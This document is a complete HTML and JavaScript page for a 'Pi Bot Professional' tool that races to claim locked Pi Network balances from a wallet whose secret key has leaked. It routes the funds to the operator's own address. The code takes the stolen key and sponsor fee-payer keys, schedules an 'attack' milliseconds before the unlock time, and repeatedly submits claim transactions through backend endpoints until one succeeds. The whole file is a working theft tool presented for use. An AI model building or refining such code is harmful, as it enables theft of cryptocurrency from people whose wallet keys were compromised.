<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pi Bot Professional - Final Edition</title>
    <style>
        :root {
            --background: #1a1a1a; --surface: #2c2c2c; --primary: #00e676; 
            --text: #f5f5f5; --error: #ff5252; --success: #69f0ae; --info: #40c4ff; 
            --border: #424242; --input-bg: #212121;
        }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--background); color: var(--text); margin: 0; padding: 15px; 
            font-size: 14px; -webkit-tap-highlight-color: transparent; 
        }
        .container { 
            max-width: 600px; margin: auto; background-color: var(--surface); 
            border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); 
            overflow: hidden; display: flex; flex-direction: column; /* Mobile first layout */
        }
        .config-panel, .log-panel { padding: 20px; }
        .log-panel { border-top: 1px solid var(--border); background-color: #2a2a2a; }

        h1, h2 { 
            color: var(--primary); text-shadow: 0 0 8px rgba(0, 230, 118, 0.4); 
            border-bottom: 1px solid var(--border); padding-bottom: 10px; margin-top: 0; 
            font-weight: 600;
        }
        h1 { font-size: 20px; text-align: center; }
        h2 { font-size: 16px; margin-top: 20px; }

        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .form-group.full-width { grid-column: 1 / -1; }
        label { display: block; margin-bottom: 8px; font-weight: 600; color: #e0e0e0; }
        small { color: #bdbdbd; display: block; margin-top: 5px; font-size: 11px; font-style: italic; }
        
        input, select, textarea { 
            width: 100%; background-color: var(--input-bg); border: 1px solid #555; 
            border-radius: 6px; padding: 10px; color: var(--text); box-sizing: border-box; 
            transition: border-color 0.2s; font-family: inherit; font-size: 14px;
        }
        textarea { resize: vertical; min-height: 60px; }
        input:focus, select:focus, textarea:focus { border-color: var(--primary); outline: none; }
        
        button { 
            padding: 12px; border: none; border-radius: 6px; font-weight: bold; 
            cursor: pointer; transition: all 0.2s; font-size: 14px;
            -webkit-tap-highlight-color: rgba(0,0,0,0.2);
        }
        button:disabled { cursor: not-allowed; opacity: 0.5; }
        #startButton { background-color: var(--primary); color: #111; grid-column: 1 / -1; }
        #stopButton { background-color: #757575; color: #f5f5f5; grid-column: 1 / -1; }
        
        .log-box { 
            height: 200px; background-color: var(--input-bg); border-radius: 5px; 
            padding: 12px; font-family: 'Fira Code', 'Courier New', monospace; 
            font-size: 12px; overflow-y: auto; margin-top: 10px; border: 1px solid var(--border); 
        }
        .log-entry { margin-bottom: 8px; word-break: break-all; } 
        .log-time { color: #9e9e9e; } .log-success { color: #69f0ae; } 
        .log-error { color: #ff5252; } .log-info { color: #40c4ff; }
        
        .status-display { 
            text-align: center; padding: 12px; background-color: var(--input-bg); 
            border-radius: 5px; margin-bottom: 15px; font-weight: bold; border: 1px solid var(--border); 
            font-size: 14px;
        }
        .status-waiting { color: #e0e0e0; } .status-attacking { color: var(--primary); animation: pulse 1.5s infinite; }
        .status-success { color: var(--success); } .status-failed { color: var(--error); }

        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 230, 118, 0.4); } 70% { box-shadow: 0 0 0 10px rgba(0, 230, 118, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 230, 118, 0); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="config-panel">
            <h1>Pi Bot Professional</h1>
            
            <h2>ðŸ”‘ Accounts</h2>
            <div class="form-grid full-width">
                <div class="form-group full-width">
                    <label>Leaked Wallet Secret Key (Sender)</label>
                    <textarea id="mnemonicInput" rows="2"></textarea>
                </div>
                <div class="form-group full-width">
                    <label>Receiver Pi Address (Your Wallet)</label>
                    <input type="text" id="receiverAddressInput">
                </div>
            </div>
            
            <h2>ðŸ’° Sponsor Wallets (Fee Payers)</h2>
            <div class="form-grid full-width">
                 <div class="form-group full-width">
                    <label>Sponsor 1 Secret Key</label>
                    <textarea id="sponsorMnemonicInput1" rows="2"></textarea>
                </div>
                 <div class="form-group full-width">
                    <label>Sponsor 2 Secret Key</label>
                    <textarea id="sponsorMnemonicInput2" rows="2"></textarea>
                </div>
                 <div class="form-group full-width">
                    <label>Sponsor 3 Secret Key</label>
                    <textarea id="sponsorMnemonicInput3" rows="2"></textarea>
                </div>
            </div>

            <h2>ðŸŽ¯ Target & Timing</h2>
            <div class="form-grid">
                <div class="form-group full-width">
                    <label>Claimable Balances (Click Fetch)</label>
                    <div style="display:flex; gap:10px;">
                        <select id="claimableIdSelect" style="flex-grow:1;"></select>
                        <button id="fetchBalancesButton" style="background-color:#4a4a4a;color:#fff;padding:10px;">Fetch</button>
                    </div>
                </div>
                <div class="form-group">
                    <label>Schedule Time (Your Local)</label>
                    <input type="datetime-local" id="scheduleTimeInput">
                </div>
                <div class="form-group">
                    <label>Unlock Time (Your Local)</label>
                    <input type="datetime-local" id="unlockTimeInput">
                </div>
                <div class="form-group">
                    <label>Early Call (ms)</label>
                    <input type="number" id="earlyCallTimeInput" value="80">
                </div>
                 <div class="form-group">
                    <label>Fee Multiplier</label>
                    <input type="number" id="feeMultiplierInput" value="2">
                </div>
            </div>
            
            <h2>ðŸ’¥ Attack Strategy</h2>
             <div class="form-grid">
                <div class="form-group">
                    <label>Auto Retry (sec)</label>
                    <input type="number" id="autoRetrySecondsInput" value="5">
                </div>
                <div class="form-group">
                    <label>Retry Delay (ms)</label>
                    <input type="number" id="retryDelayInput" value="250">
                </div>
                <div class="form-group full-width">
                    <label>Records Per Attempt</label>
                    <input type="number" id="recordsPerAttemptInput" value="1">
                    <small>Sends multiple claim operations in a single transaction. Default is 1.</small>
                </div>
            </div>
        </div>

        <div class="log-panel">
            <h2>ðŸ“Š Attack Log & Status</h2>
            <div id="statusDisplay" class="status-display status-waiting">STATUS: WAITING</div>
            <div id="attemptCounter" class="status-display status-waiting" style="font-size:12px; padding: 8px;">ATTEMPTS: 0</div>
            <div id="logBox" class="log-box">Initialize your settings and start the attack.</div>
            <div class="form-grid" style="margin-top: 20px;">
                <button id="startButton">Start Attack</button>
                <button id="stopButton" disabled>Stop Attack</button>
            </div>
        </div>
    </div>

<script>
    // --- ELEMENT SELECTORS ---
    const el = {
        mnemonic: document.getElementById('mnemonicInput'),
        sponsors: [
            document.getElementById('sponsorMnemonicInput1'),
            document.getElementById('sponsorMnemonicInput2'),
            document.getElementById('sponsorMnemonicInput3'),
        ],
        claimableId: document.getElementById('claimableIdSelect'),
        fetchBalances: document.getElementById('fetchBalancesButton'),
        receiver: document.getElementById('receiverAddressInput'),
        scheduleTime: document.getElementById('scheduleTimeInput'),
        unlockTime: document.getElementById('unlockTimeInput'),
        earlyCall: document.getElementById('earlyCallTimeInput'),
        feeMultiplier: document.getElementById('feeMultiplierInput'),
        autoRetrySeconds: document.getElementById('autoRetrySecondsInput'),
        retryDelay: document.getElementById('retryDelayInput'),
        recordsPerAttempt: document.getElementById('recordsPerAttemptInput'),
        start: document.getElementById('startButton'),
        stop: document.getElementById('stopButton'),
        status: document.getElementById('statusDisplay'),
        attemptCounter: document.getElementById('attemptCounter'),
        logBox: document.getElementById('logBox'),
    };

    // --- BOT STATE & CACHE ---
    let attackState = {
        isRunning: false,
        stopRequested: false,
        timeoutId: null,
        attemptCount: 0
    };
    let lockedBalancesCache = [];

    // --- UTILITY FUNCTIONS ---
    function log(type, message) {
        const time = new Date().toLocaleTimeString();
        el.logBox.innerHTML += `<div class="log-entry"><span class="log-time">[${time}]</span> <span class="log-${type}">${message}</span></div>`;
        el.logBox.scrollTop = el.logBox.scrollHeight;
    }
    
    function updateStatus(statusType, message) {
        el.status.className = `status-display status-${statusType}`;
        el.status.textContent = `STATUS: ${message}`;
    }

    function updateAttemptCounter() {
        el.attemptCounter.textContent = `ATTEMPTS: ${attackState.attemptCount}`;
    }
    
    // --- BALANCE FETCHING ---
    async function fetchBalances() {
        if (!el.mnemonic.value) {
            log('error', 'Leaked Wallet Secret Key is required to fetch balances.');
            return;
        }
        log('info', 'Fetching claimable balances...');
        el.fetchBalances.disabled = true;
        updateStatus('waiting', 'FETCHING...');
        try {
            // NOTE: Replace with your actual backend endpoint if different.
            const res = await fetch('/.netlify/functions/getClaimableBalances', {
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ mnemonic: el.mnemonic.value })
            });
            const result = await res.json();
            if (!result.success) throw new Error(result.error);
            
            lockedBalancesCache = result.balances;
            el.claimableId.innerHTML = '';
            if (lockedBalancesCache.length === 0) {
                log('info', 'No claimable balances found for this account.');
            } else {
                lockedBalancesCache.forEach(b => {
                    const optionText = `${b.amount} Pi | Expires: ${new Date(b.expiry).toLocaleString()}`;
                    el.claimableId.add(new Option(optionText, b.id));
                });
                log('success', `Found and loaded ${lockedBalancesCache.length} balance(s).`);
            }
            updateStatus('waiting', 'READY');
        } catch (err) { 
            log('error', `Fetch failed: ${err.message}`); 
            updateStatus('failed', 'FETCH FAILED'); 
        } finally { 
            el.fetchBalances.disabled = false; 
        }
    }

    // --- CORE TRANSACTION LOGIC ---
    async function attemptSingleTransaction(sponsorMnemonic) {
        try {
            // NOTE: Replace with your actual backend endpoint if different.
            const res = await fetch('/.netlify/functions/submitTransaction', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    senderMnemonic: el.mnemonic.value,
                    sponsorMnemonic: sponsorMnemonic,
                    claimableId: el.claimableId.value,
                    receiverAddress: el.receiver.value,
                    feeMultiplier: el.feeMultiplier.value,
                    recordsPerAttempt: el.recordsPerAttempt.value,
                })
            });
            const result = await res.json();
            return result;
        } catch (err) {
            log('error', `Network/Fetch Error: ${err.message}`);
            return { success: false, error: 'network_error' };
        }
    }

    // --- MAIN ATTACK LOGIC ---
    async function startAttackSequence() {
        if (attackState.isRunning) return;
        attackState.isRunning = true;
        attackState.stopRequested = false;
        attackState.attemptCount = 0;
        
        const sponsorKeys = el.sponsors.map(s => s.value).filter(Boolean);
        if (sponsorKeys.length === 0) {
            log('error', 'At least one Sponsor Wallet is required to pay fees.');
            stopBot();
            return;
        }
        log('info', `Attack will use ${sponsorKeys.length} sponsor wallet(s).`);

        const autoRetryDuration = parseInt(el.autoRetrySeconds.value, 10) * 1000;
        const retryDelay = parseInt(el.retryDelay.value, 10);
        const attackEndTime = Date.now() + autoRetryDuration;
        
        updateStatus('attacking', 'ATTACKING NOW!');

        // --- THE SMART RETRY LOOP ---
        while (Date.now() < attackEndTime && !attackState.stopRequested) {
            attackState.attemptCount++;
            updateAttemptCounter();
            log('info', `--- ATTEMPT #${attackState.attemptCount} ---`);

            const transactionPromises = sponsorKeys.map(key => attemptSingleTransaction(key));
            const results = await Promise.all(transactionPromises);

            let isRaceOver = false;
            let wasSuccessful = false;

            for (const result of results) {
                if (result.success) {
                    log('success', `âœ…âœ…âœ… SUCCESS! Hash: ${result.hash}`);
                    wasSuccessful = true;
                    break; 
                } else {
                    log('error', `Attempt Failed: ${result.error}`);
                    const errorStr = result.error ? result.error.toLowerCase() : '';
                    if (errorStr.includes('tx_too_late') || errorStr.includes('op_no_entry')) {
                        isRaceOver = true;
                    }
                }
            }

            if (wasSuccessful) {
                updateStatus('success', 'CLAIM SUCCESSFUL!');
                stopBot();
                return;
            }

            if (isRaceOver) {
                log('error', 'Fatal error detected. Race is over. Stopping.');
                updateStatus('failed', 'RACE LOST');
                stopBot();
                return;
            }

            if (Date.now() < attackEndTime && !attackState.stopRequested) {
                await new Promise(resolve => setTimeout(resolve, retryDelay));
            }
        }

        if (!attackState.stopRequested) {
            log('error', 'Auto-retry time limit reached. Stopping.');
            updateStatus('failed', 'TIME LIMIT REACHED');
            stopBot();
        }
    }

    // --- BOT CONTROL ---
    function scheduleBot() {
        if (!el.mnemonic.value || !el.unlockTime.value || !el.claimableId.value || !el.receiver.value || !el.scheduleTime.value) {
            log('error', 'Please fill all required fields, including fetching a balance.');
            return;
        }

        el.start.disabled = true;
        el.stop.disabled = false;
        
        const scheduleTime = new Date(el.scheduleTime.value).getTime();
        const unlockTime = new Date(el.unlockTime.value).getTime();
        const earlyCall = parseInt(el.earlyCall.value, 10);
        
        const finalAttackTime = unlockTime - earlyCall;

        const scheduleWaitTime = scheduleTime - Date.now();
        if (scheduleWaitTime < 0) {
            log('error', 'Schedule time is in the past!');
            stopBot();
            return;
        }
        updateStatus('waiting', `SCHEDULED`);
        log('info', `Bot is scheduled. It will wake up at ${new Date(scheduleTime).toLocaleTimeString()}.`);

        attackState.timeoutId = setTimeout(() => {
            log('info', `Bot is awake. Now waiting for the attack time.`);
            
            const attackWaitTime = finalAttackTime - Date.now();
            if (attackWaitTime < 0) {
                log('error', 'Unlock time (with early call) is in the past! Cannot attack.');
                stopBot();
                return;
            }
            log('info', `Attack will begin at ${new Date(finalAttackTime).toLocaleTimeString()} (${earlyCall}ms early).`);
            log('info', `Waiting for ${Math.round(attackWaitTime / 1000)} more second(s)...`);
            updateStatus('waiting', 'ARMED & WAITING');
            
            attackState.timeoutId = setTimeout(startAttackSequence, attackWaitTime);

        }, scheduleWaitTime);
    }
    
    function stopBot() {
        if (attackState.timeoutId) {
            clearTimeout(attackState.timeoutId);
            attackState.timeoutId = null;
        }
        attackState.isRunning = false;
        attackState.stopRequested = true;
        
        el.start.disabled = false;
        el.stop.disabled = true;
        
        if (!el.status.textContent.includes('SUCCESS')) {
            updateStatus('failed', 'STOPPED BY USER');
        }
        log('info', 'Bot has been stopped.');
    }

    // --- EVENT LISTENERS ---
    el.fetchBalances.addEventListener('click', fetchBalances);
    el.start.addEventListener('click', scheduleBot);
    el.stop.addEventListener('click', stopBot);

</script>
</body>
</html>
